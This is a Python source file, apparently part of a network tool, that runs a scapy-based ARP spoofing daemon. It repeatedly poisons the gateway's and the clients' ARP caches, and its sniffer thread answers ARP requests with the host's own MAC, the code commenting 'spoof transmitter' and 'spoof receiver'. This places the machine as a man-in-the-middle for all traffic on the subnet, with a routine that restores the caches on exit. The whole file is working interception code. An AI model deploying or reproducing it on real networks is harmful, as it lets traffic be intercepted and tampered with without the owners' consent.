import sys
import os
import thread
import logging
import time
import netifaces as ni
import threading
import socket
import struct
import binascii

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
# suppresses following message
# WARNING: No route found for IPv6 destination :: (no default route?)
from scapy.all import conf, sendp, srp, ARP, Ether, ETHER_BROADCAST, sniff
from netaddr import IPAddress, IPNetwork, AddrFormatError

import util


class DaemonApp():

    def __init__(self, logger, interface, pidfile, stdout, stderr):
        # disable scapys verbosity global
        conf.verb = 0

        self.stdin_path = os.devnull
        self.stdout_path = stdout
        self.stderr_path = stderr
        self.pidfile_path = pidfile
        self.pidfile_timeout = 5
        # self.pidfile_timeout = 0

        self.logger = logger
        self.interface = interface

        if_info = None
        try:
            if_info = ni.ifaddresses(self.interface)
        except ValueError as e:
            self.logger.error("An error concerning the interface {} has occurred: {}".format(self.interface, str(e)))
            raise DaemonError()

        # get ip of specified interface
        self.ip = if_info[2][0]['addr']
        # get subnetmask of specified interface
        self.netmask = if_info[2][0]['netmask']
        # get mac address of specified interface
        self.mac = if_info[17][0]['addr']

        # get network address
        try:
            self.network = IPNetwork("{}/{}".format(self.ip, self.netmask))
        except AddrFormatError as afe:
            # this should never happen, because values are retrieved via netifaces library
            self.logger.error("A grave error happened during determinig the network: {}".format(str(afe)))
            raise DaemonError()

        # get default gateway
        try:
            self.gateway = ni.gateways()["default"][ni.AF_INET][0]
        except KeyError:
            self.logger.error("No default gateway is configured")
            raise DaemonError()

        # get all ip addresses that are in the specified network
        # and remove network address, broadcast, own ip, gateway ip
        self.ip_range = list(self.network)
        self.ip_range.remove(IPAddress(self.ip))
        self.ip_range.remove(IPAddress(self.gateway))
        self.ip_range.remove(IPAddress(self.network.broadcast))
        self.ip_range.remove(IPAddress(self.network.network))

        try:
            # get MAC address of gateway
            self.gateMAC = util.get_mac(self.gateway, self.interface)
        except Exception:
            self.logger.error("Unable to get MAC address of Gateway")
            raise DaemonError()

        self.t1 = SniffThread(self.interface, self.gateway, self.mac, self.gateMAC)
        self.t1.daemon = True

    def __return_to_normal(self):
        # clients gratutious arp
        sendp(
            Ether(dst=ETHER_BROADCAST) / ARP(op=1, psrc=self.gateway, pdst=self.gateway, hwdst=ETHER_BROADCAST,
                                             hwsrc=self.gateMAC))
        # to clients so that they send and arp reply to the gateway
        sendp(Ether(dst=ETHER_BROADCAST) / ARP(op=1, psrc=self.gateway, pdst=str(self.network), hwsrc=self.gateMAC))

    def exit(self, signal_number, stack_frame):
        self.__return_to_normal()
        # TODO check if thread is alive (active)
        self.t1.stop()
        raise SystemExit()

    def run(self):
        # start sniffing thread
        self.t1.start()

        # this updates existing entries in the arp table of the gateway
        packets = [Ether(dst=self.gateMAC) / ARP(op=1, psrc=str(x), pdst=str(x)) for x in self.ip_range]
        # gratuitous arp to clients
        packets.append(Ether(dst=ETHER_BROADCAST) / ARP(op=1, psrc=self.gateway, pdst=self.gateway,
                                                        hwdst=ETHER_BROADCAST))
        while True:
            sendp(packets)
            # increasing this value shouldn't be a problem
            time.sleep(20)


class SniffThread(threading.Thread):

    def __init__(self, interface, gateway, mac, gateMAC):
        threading.Thread.__init__(self)
        # super(self.__class__, self).__init__()
        self.interface = interface
        self.gateway = gateway
        self.mac = mac
        self.gateMAC = gateMAC

    def run(self):
        # the filter argument in scapy's sniff function seems to be applied too late
        # therefore some unwanted packets are processed (e.g. tcp packets of ssh session)
        # but it still decreases the number of packets that need to be processed by the lfilter function
        sniff(prn=self.__arp_handler, filter="arp and inbound", lfilter=lambda x: x.haslayer(ARP), store=0, iface=self.interface)

    def __arp_handler(self, pkt):
        if pkt[ARP].op == 1:

            if pkt[Ether].dst == self.mac:
                # incoming packets(that are sniffed): Windows correctly fills in the hwdst, linux (router) only 00:00:00:00:00:00
                sendp(Ether(dst=pkt[Ether].src) / ARP(op=2, psrc=pkt[ARP].pdst, pdst=pkt[ARP].psrc, hwdst=pkt[ARP].hwsrc, hwsrc=self.mac))
                # TODO also spoof gateway?

            # broadcast request to or from gateway
            elif pkt[Ether].dst.lower() == util.hex2str_mac(ETHER_BROADCAST) and (pkt[ARP].psrc == self.gateway or pkt[ARP].pdst == self.gateway):
                # spoof transmitter
                packets = [Ether(dst=pkt[Ether].src) / ARP(op=2, psrc=pkt[ARP].pdst, pdst=pkt[ARP].psrc, hwsrc=self.mac, hwdst=pkt[ARP].hwsrc)]

                # get mac address of original target
                dest = self.gateMAC
                if pkt[ARP].pdst != self.gateway:
                    dest = util.get_mac(pkt[ARP].pdst, self.interface)

                # spoof receiver
                packets.append(Ether(dst=dest) / ARP(op=2, psrc=pkt[ARP].psrc, hwsrc=self.mac, pdst=pkt[ARP].pdst, hwdst=dest))

                # print packets[0].show()
                # print packets[1].show()

                threading.Timer(7.0, sendp, [packets]).start()

    def stop(self):
        thread.exit()


class DaemonError(Exception):
    pass
